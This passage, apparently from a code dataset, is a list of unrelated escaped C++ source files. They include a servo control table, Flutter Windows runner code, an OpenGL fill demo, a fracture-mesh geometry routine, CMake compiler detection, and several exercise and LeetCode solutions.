{ControlTableItem::PRESENT_SPEED,         38, 2},\n  {ControlTableItem::PRESENT_LOAD,          40, 2},\n  {ControlTableItem::PRESENT_VOLTAGE,       42, 1},\n  {ControlTableItem::PRESENT_TEMPERATURE,   43, 1},\n  {ControlTableItem::REGISTERED,            44, 1},\n  {ControlTableItem::MOVING,                46, 1},    \n  {ControlTableItem::LOCK,                  47, 1},\n  {ControlTableItem::PUNCH,                 48, 2},\n  {ControlTableItem::REALTIME_TICK,         50, 2},\n  {ControlTableItem::GOAL_ACCELERATION,     73, 1},\n#endif\n  {ControlTableItem::LAST_DUMMY_ITEM,        0, 0}\n};\n\nconst ModelControlTableInfo_t mx64_control_table[] PROGMEM = {\n#if (ENABLE_ACTUATOR_MX64)\n  {ControlTableItem::CURRENT,                 68, 2},\n  {ControlTableItem::TORQUE_CTRL_MODE_ENABLE, 70, 1},\n  {ControlTableItem::GOAL_TORQUE,             71, 2},\n#endif\n  {ControlTableItem::LAST_DUMMY_ITEM,          0, 0}\n};\n\nconst ModelControlTableInfo_t mx106_control_table[] PROGMEM = {\n#if (ENABLE_ACTUATOR_MX106)\n  {ControlTableItem::DRIVE_MODE,              10, 1},\n  {ControlTableItem::CURRENT,                 68, 2},\n  {ControlTableItem::TORQUE_CTRL_MODE_ENABLE, 70",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include<iostream>\n#include<GL/glut.h>\nusing namespace std;\n\nvoid myInit() {\n\tglClearColor(1.0, 1.0, 1.0, 0);\n\tglColor3f(0.0, 0.0, 0.0);\n\tglPointSize(1.0);\n\tglMatrixMode(GL_PROJECTION);\n\tgluOrtho2D(0, 640, 0, 480);\n}\n\nvoid boundaryFill(float x, float y, float* b, float* n) {\n\tfloat color[3];\n\tglReadPixels(x, y, 1.0, 1.0, GL_RGB, GL_FLOAT, color);\n\tif((color[0] != b[0] || color[1] != b[1] || color[2] != b[2]) && (color[0] != n[0] || color[1] != n[1] || color[2] != n[2])) {\n\t\tglColor3f(n[0], n[1], n[2]);\n\t\tglBegin(GL_POINTS);\n\t\t\tglVertex2d(x, y);\n\t\tglEnd();\n\t\tglFlush();\n\t\tboundaryFill(x + 1, y, b, n);\n\t\tboundaryFill(x - 2, y, b, n);\n\t\tboundaryFill(x, y + 1, b, n);\n\t\tboundaryFill(x, y - 2, b, n);\n\t\tboundaryFill(x + 1, y + 1, b, n);\n\t\tboundaryFill(x + 1, y - 1, b, n);\n\t\tboundaryFill(x - 1, y + 1, b, n);\n\t\tboundaryFill(x - 1, y - 1, b, n);\n\t}\n}\n\nvoid floodFill(float x, float y, float *b, float *n) {\n\tglColor3f(0.0, 0.0, 0.0);\n\tglBegin(GL_LINE_LOOP);\n\tglVertex2d(40, 440);\n\tglVertex2d(600, 440);\n\tglColor3f(0.0, 1.0, 1.0);\n\tglVertex2d(600, 40);\n\tglVertex2d(40, 40);\n\tglEnd();\n\tfloat color[3];\n\tglReadPixels(x, y, 1.0, 1.0, GL_RGB, GL_FLOAT, color);\n\tif(color[0] == b[0] && color[1] == b[1] && color[2] == b[2]) {\n\t\tglColor3f(n[0], n[1], n[2]);\n\t\tglBegin(GL_POINTS);\n\t\t\tglVertex2d(x, y);\n\t\tglEnd();\n\t\tglFlush();\n\t\tfloodFill(x + 1, y, b, n);\n\t\tfloodFill(x - 2, y, b, n);\n\t\tfloodFill(x, y + 1, b, n);\n\t\tfloodFill(x, y - 2, b, n);\n\t\tfloodFill(x + 1, y + 1, b, n);\n\t\tfloodFill(x + 1, y - 1, b, n);\n\t\tfloodFill(x - 1, y + 1, b, n);\n\t\tfloodFill(x - 1, y - 1, b, n);\n\t}\n}\n\nvoid myDisplay() {\n\tglClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n\tglLineWidth(3);\n\tglPointSize(2);\n\tglColor3f(0.0, 0.0, 0.0);\n\tglBegin(GL_LINE_LOOP);\n\tglVertex2d(40, 440);\n\tglVertex2d(600, 440);\n\tglVertex2d(600, 40);\n\tglVertex2d(40, 40);\n\tglEnd();\n\tglFlush();\n}\n\nvoid mouse(int btn, int state, int x, int y) {\n\ty = 480 - y;\n\tif(btn == GLUT_LEFT_BUTTON) {\n\t\tif(state == GLUT_DOWN) {\n\t\t\tfloat b[] = {0, 0, 0};\n\t\t\tfloat n[] = {1, 0, 0};\n\t\t\tboundaryFill(x, y, b, n);\n\t\t}\n\t} else if(btn == GLUT_RIGHT_BUTTON) {\n\t\tif(state == GLUT_DOWN) {\n\t\t\tfloat b[3];\n\t\t\tglReadPixels(x, y, 1.0, 1.0, GL_RGB, GL_FLOAT, b);\n\t\t\tcout << b[0] << b[1] << b[2];\n\t\t\tfloat n[] = {1, 0, 0};\n\t\t\tfloodFill(x, y, b, n);\n\t\t}\n\t}\n}\n\nint main(int argc, char ** argv) {\n\tcout << (\"Left Mouse Button: Boundary Fill Right Mouse Button: Flood Fill\");\n\tglutInit(&argc,argv);\n\tglutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);\n\tglutInitWindowSize(640,480);\n\tglutInitWindowPosition(100,100);\n\tglutCreateWindow(\"Filling\");\n\tmyInit();\n\tglutMouseFunc(mouse);\n\tglutDisplayFunc(myDisplay);\n\tglutMainLoop();\n}\n",
    "#include \"PolygonalMesh.hpp\"\n#include \"FracturesLibrary.hpp\"\n#include \"reshaping_array.hpp\"\n\nusing namespace PolygonalLibrary;\nusing namespace FracturesLibrary;\n\nnamespace FracturesLibrary{\n\n//funzioni di supporto\ninline MatrixXd Retta_per_due_punti(Vector3d& pt1, Vector3d& pt2)\n{\n    // l'equazione parametrica \u00e8 X = at+P\n\n    // passo 1: salvo le coordinate dei due punti\n    double x1 = pt1[0];\n    double y1 = pt1[1];\n    double z1 = pt1[2];\n\n    double x2 = pt2[0];\n    double y2 = pt2[1];\n    double z2 = pt2[2];\n\n    // passo 2: trovo direttrice e punto di partenza della retta\n\n    Vector3d t = {x2-x1,y2-y1,z2-z1};\n    Vector3d P = {x1,y1,z1};\n\n    // salvo in un formato particolare\n    MatrixXd X;\n    X.resize(2,3);\n    X.row(0) = t.transpose();\n    X.row(1) = P.transpose();  // come una matrice 2x3\n\n    return X;\n\n}\n\ninline Vector2d intersezione_rette(MatrixXd& r_frattura, MatrixXd& r_traccia)\n{\n\n    //imposto un sistema lineare per la ricerca dei parametri alpha e beta\n    //primo parametro \u00e8 la matrice della retta del poligono --> retta in funzione di alpha\n    Vector3d t1 = r_frattura.row(0).transpose();\n    Vector3d P1 = r_frattura.row(1).transpose();\n\n    //secondo parametro \u00e8 la matrice della retta della traccia --> retta in funzione di beta\n    Vector3d t2 = r_traccia.row(0).transpose();\n    Vector3d P2 = r_traccia.row(1).transpose();\n\n    MatrixXd A = MatrixXd::Zero(3,2);\n    Vector3d b = Vector3d::Zero();\n\n    //imposto i coefficienti della matrice e del termine noto\n    A.col(0) = t1;\n    A.col(1) = -t2;\n\n    for (unsigned int i = 0; i<3; i++){b[i] = P2[i]-P1[i];}\n\n    Vector2d x = A.householderQr().solve(b); //x =[alpha; beta]\n\n    Vector2d alpha_beta = x;\n    return alpha_beta;\n\n}\n\ninline double appartiene_a_segmento(Vector3d& origin, Vector3d& end, Vector3d& pto, double toll){\n    bool appartiene = false;\n\n    //calcolo la distanza di pto dai due estremi del segmento, se la somma di queste due distanza \u00e8 maggiore della distanza dei\n    // due estremi allora il pto \u00e8 esterno\n    double lung_segmento = (origin-end).norm();\n    double pto_o = (origin-pto).norm();\n    double pto_e = (end-pto).norm();\n\n    if(abs(pto_o + pto_e - lung_segmento) < toll){appartiene = true;}\n\n    return appartiene;\n\n}\n\ninline double pto_unico(Vector3d& pto, vector<Vector3d>& punti, double toll, unsigned int& id){\n    //l'id mi serve quando cerco un punto tra i vertici\n\n    bool unico = true;\n\n    if(punti.size() == 0){return unico;}\n\n    for (unsigned int i = 0; i < punti.size(); i++){\n        Vector3d elem = punti[i];\n        bool uguagl_x = (abs(pto[0] - elem [0]) < toll);\n        bool uguagl_y = (abs(pto[1] - elem [1]) < toll);\n        bool uguagl_z = (abs(pto[2] - elem [2]) < toll);\n\n        if (uguagl_x && uguagl_y && uguagl_z){unico = false; id = i; return unico;}\n    }\n    return unico;\n}\n/*****************************************************************************************************************************/\n\nvoid divisione_sottopol(const Fracture& frattura, list<Trace> P_traces,  list<Trace> NP_traces, PolygonalMesh& mesh, const double& toll, list<unsigned int> lista_vert){\n    /*questa procedura sar\u00e0 definita ricorsivamente:\n        * prima divido la frattura in due in base alla prima traccia che dobbiamo considerare\n        * vado a dividere le tracce restanti in base a quale poligono appartengono\n        * if(traccia i poligono  == 0){salvo il poligono nella mesh}\n        * else{richiamo questa funzione}\n\n    *se sono entrata in questa procedura \u00e8 perch\u00e9 c'\u00e8 almeno una traccia associata alla frattura\n    */\n\n    //ricordiamo: prima le tracce passanti, poi quelle non passanti in ordine decrescente (le liste sono gi\u00e0 ordinate)\n    Trace traccia_tagliante;\n    if (P_traces.size() != 0){\n        auto it = P_traces.begin();\n        traccia_tagliante = *it;\n        P_traces.pop_front();\n    }\n    else{\n        auto it = NP_traces.begin();\n        traccia_tagliante = *it;\n        NP_traces.pop_front();\n    }\n\n    Vector3d pt1 = traccia_tagliante.coordinates_extremes.col(0);\n    Vector3d pt2 = traccia_tagliante.coordinates_extremes.col(1);\n    MatrixXd retta_traccia = Retta_per_due_punti(pt1, pt2);\n    Vector3d dir_t = retta_traccia.row(0);\n\n    //ciclo sui lati della frattura per cercare i due punti di intersezione (devo gestire il caso di capotare su un vertice --> conta doppio)\n    vector<Vector3d> nuovi_punti;\n    vector<unsigned int> id_nuoviPunti;\n    nuovi_punti.reserve(4); //male che vada ho 4 beta\n    id_nuoviPunti.reserve(4);\n\n\n    for (unsigned int i = 0; i< frattura.num_vertici; i++){\n        unsigned int id_o = frattura.vertices[i];\n        unsigned int id_e;\n        if(i==frattura.num_vertici-1){id_e = frattura.vertices[0];}\n        else{id_e = frattura.vertices[i+1];}\n\n        Vector3d origin = mesh.Cell0DCoordinates[id_o];\n        Vector3d end = mesh.Cell0DCoordinates[id_e];\n        MatrixXd retta_fratt = Retta_per_due_punti(origin, end);\n        Vector3d dir_f = retta_fratt.row(0);\n\n       ",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ = VVRP + 1100 */\n# define COMPILER_VERSION_MAJOR DEC((__WATCOMC__ - 1100) / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(",
    "#include <iostream>\n#define MAX_SIZE 100 // Maximum size of the stack\n\nusing namespace std;\n\nclass Stack {\nprivate:\n    int arr[MAX_SIZE];\n    int top; // Index of the top element of the stack\npublic:\n    // Constructor\n    Stack() {\n        top = -1; // Stack is initially empty\n    }\n\n    // Function to push an element onto the stack\n    void push(int value) {\n        if (top == MAX_SIZE - 1) {\n            cout << \"Stack Overflow! Cannot push more elements.\\n\";\n            return;\n        }\n        arr[++top] = value;\n    }\n\n    // Function to pop an element from the stack\n    void pop() {\n        if (isEmpty()) {\n            cout << \"Stack Underflow! Cannot pop from an empty stack.\\n\";\n            return;\n        }\n        top--;\n    }\n\n    // Function to return the top element of the stack\n    int peek() {\n        if (isEmpty()) {\n            cout << \"Stack is empty!\\n\";\n            return -1;\n        }\n        return arr[top];\n    }\n\n    // Function to check if the stack is empty\n    bool isEmpty() {\n        return top == -1;\n    }\n};\n\nint main() {\n    Stack myStack;\n    \n    myStack.push(5);\n    myStack.push(10);\n    myStack.push(15);\n    \n    cout << \"Top element: \" << myStack.peek() << endl;\n    \n    myStack.pop();\n    cout << \"Top element after pop: \" << myStack.peek() << endl;\n    \n    myStack.pop();\n    myStack.pop(); // Trying to pop from an empty stack\n    \n    return 0;\n}\n",
    "// Company Tags                : Amazon\n// Leetcode Link               : https://leetcode.com/problems/double-a-number-represented-as-a-linked-list\n\n#include <iostream>\n#include <algorithm>\nusing namespace std;\n\nclass ListNode {\npublic: \n    int val;\n    ListNode* next;\n\n    ListNode(int data) {\n        this->val = data;\n        this->next = NULL;\n    }\n\n    void printLL(ListNode* head) {\n        ListNode* temp = head;\n        while(temp) {\n            cout << temp->val << \" \";\n            temp = temp->next;\n        }\n        cout << endl;\n        delete(temp);\n    }\n};\n\n// Approach-1 (Using Reverse of LinkedList) T.C : O(n), S.C : O(n)\nclass Solution1 {\npublic:\n    ListNode* reverseList(ListNode* head) {\n        ListNode* prevNode = NULL;\n        ListNode* currNode = head;\n\n        while(currNode) {\n            ListNode* nextNode = currNode->next;\n            currNode->next = prevNode;\n            prevNode = currNode;\n            currNode = nextNode;\n        }\n        return prevNode;\n    }\n\n    ListNode* doubleIt(ListNode* head) {\n        ListNode *temp = head;\n        temp = reverseList(temp);\n\n        ListNode* prevNode = NULL;\n        ListNode* currNode = temp;\n        int carry = 0;\n\n        while(currNode) {\n            int num = currNode->val * 2 + carry;\n            currNode->val = num % 10;\n\n            carry = (num >= 10) ? 1 : 0;\n\n            prevNode = currNode;\n            currNode = currNode->next;\n        }\n\n        if(carry != 0) {\n            ListNode* newNode = new ListNode(carry);\n            prevNode->next = newNode;\n        }\n        return reverseList(temp);\n    }\n};\n\n// Approach-2 (Using Recursion) T.C : O(n), S.C : O(n) system stack space\nclass Solution2 {\npublic:\n    int helper(ListNode * head) {\n        if(head == NULL) return 0;\n\n        int carry = helper(head->next);\n        int newValue = head->val * 2 + carry;\n        head->val = newValue % 10;\n\n        return newValue / 10;\n    }\n\n    ListNode* doubleIt(ListNode* head) {\n        int carry = helper(head);\n\n        if(carry != 0) {\n            ListNode* newNode = new ListNode(carry);\n            newNode->next = head;\n            head = newNode;\n        }\n        return head;\n    }\n};\n\n// Approach-3 (Using prev and curr left to right traversal) T.C : O(n), S.C : O(1)\nclass Solution3 {\npublic:\n    ListNode* doubleIt(ListNode* head) {\n\n        ListNode* prevNode = NULL;\n        ListNode* currNode = head;\n\n        while (currNode) {\n            int newValue = currNode->val * 2;\n\n            if (newValue < 10) {\n                currNode->val = newValue;\n            } \n            else if(prevNode != NULL) {\n                currNode->val = newValue % 10;\n                prevNode->val += 1;\n            }\n            else {\n                ListNode *newNode = new ListNode(1);\n                currNode->val = newValue % 10;\n                newNode->next = currNode;\n                head = newNode;\n            }\n\n            prevNode = currNode;\n            currNode = currNode->next;\n        }\n        return head;\n    }\n};\n\nint main() {\n    ListNode* head = new ListNode(9), *second = new ListNode(9), *third = new ListNode(9);\n    head->next = second;\n    second->next = third;\n    \n    cout << \"Original Linked List: \";\n    head->printLL(head);\n\n    // Solution1 obj1;\n    // ListNode *ans1 = obj1.doubleIt(head);\n    // cout << \"\\nApproach-1 (Using Reverse of LinkedList) : \";\n    // head->printLL(ans1);\n\n    // Solution2 obj1;\n    // ListNode *ans1 = obj1.doubleIt(head);\n    // cout << \"\\nApproach-2 (Using Recursion) : \";\n    // head->printLL(ans1);\n\n    Solution3 obj1;\n    ListNode *ans1 = obj1.doubleIt(head);\n    cout << \"\\nApproach-3 (Using prev and curr left to right traversal) : \";\n    head->printLL(ans1);\n    return 0;\n}\n",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   ClapTrap.cpp                                       :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: alaassir <alaassir@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/01 00:30:07 by alaassir          #+#    #+#             */\n/*   Updated: 2024/05/01 01:08:32 by alaassir         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"ClapTrap.hpp\"\n\nClapTrap::ClapTrap()\n{\n\tstd::cout << \"ClapTrap default constructor is called\" << std::endl;\n\tthis->name = \"Default\";\n\tthis->hit_points = 10;\n\tthis->enrgy_points = 10;\n\tthis->attack_damage = 0;\n}\n\nClapTrap::ClapTrap(std::string _name)\n{\n\tstd::cout << \"ClapTrap parametrized constructor is called\" << std::endl;\n\tthis->name = _name;\n\tthis->hit_points = 10;\n\tthis->enrgy_points = 10;\n\tthis->attack_damage = 0;\n}\n\nClapTrap::ClapTrap(const ClapTrap &CT)\n{\n\tstd::cout << \"ClapTrap copy constructor is called\" << std::endl;\n\t*this = CT;\n}\n\nClapTrap::~ClapTrap()\n{\n\tstd::cout << \"ClapTrap destructor is called\" << std::endl;\n}\n\nClapTrap\t&ClapTrap::operator=(const ClapTrap &CT)\n{\n\tstd::cout << \"ClapTrap assignement operator is called\" << std::endl;\n\tthis->name = CT.name;\n\tthis->hit_points = CT.hit_points;\n\tthis->enrgy_points = CT.enrgy_points;\n\tthis->attack_damage = CT.attack_damage;\n\treturn (*this);\n}\n\nvoid\tClapTrap::attack(const std::string &target)\n{\n\tif (this->enrgy_points > 0)\n\t{\n\t\tstd::cout << \"ClapTrap \" << this->name << \" attacks \" << target << \\\n\t\t\", causing \" << this->attack_damage << \" points of damage!\" << std::endl;\n\t\tthis->enrgy_points--;\n\t}\n}\n\nvoid\tClapTrap::takeDamage(unsigned int amount)\n{\n\tif (amount < this->hit_points)\n\t\tthis->enrgy_points -= amount;\n\telse if (this->enrgy_points > 0)\n\t\tthis->enrgy_points = 0;\n\telse\n\t\tstd::cout << this->name << \" is already dead!\" << std::endl;\n}\n\nvoid\tClapTrap::beRepaired(unsigned int amount)\n{\n\tif (this->hit_points == 0)\n\t\tstd::cout << this->name << \" is already dead! and cannot repair itself.\" << std::endl;\n\telse if (this->enrgy_points == 0)\n\t\tstd::cout << this->name << \" don't enough energy points to repaire itself.\" << std::endl;\n\telse if (this->hit_points + amount > 10)\n\t\tstd::cout << this->name << \" can't have more than 10 hit points.\" << std::endl;\n\telse\n\t\tthis->hit_points += amount;\n}\n",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct ListNode {\n    int val;\n    ListNode *next;\n    ListNode() : val(0), next(nullptr) {\n    }\n    ListNode(int x) : val(x), next(nullptr) {\n    }\n    ListNode(int x, ListNode *next) : val(x), next(next) {\n    }\n};\n\nstruct TreeNode {\n    int val;\n    TreeNode *left;\n    TreeNode *right;\n    TreeNode() : val(0), left(nullptr), right(nullptr) {\n    }\n    TreeNode(int x) : val(x), left(nullptr), right(nullptr) {\n    }\n    TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {\n    }\n};\n\nclass Node {\npublic:\n    int val;\n    vector<Node *> neighbors;\n    Node() {\n        val = 0;\n        neighbors = vector<Node *>();\n    }\n    Node(int _val) {\n        val = _val;\n        neighbors = vector<Node *>();\n    }\n    Node(int _val, vector<Node *> _neighbors) {\n        val = _val;\n        neighbors = _neighbors;\n    }\n};\n\n/*the solution should start from below*/\n\nclass Solution {\npublic:\n    vector<string> removeSubfolders(vector<string> &folder) {\n        const int n = static_cast<int>(folder.size());\n        sort(folder.begin(), folder.end());\n\n        string prev = folder[0] + \"/\"s;\n        vector<string> ans;\n        ans.push_back(folder[0]);\n        for (int i = 1; i < n; i++) {\n            string tmp = folder[i] + \"/\";\n            if (tmp.starts_with(prev)) continue;\n            else {\n                ans.push_back(folder[i]);\n                prev = tmp;\n            }\n        }\n        return ans;\n    }\n};",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window 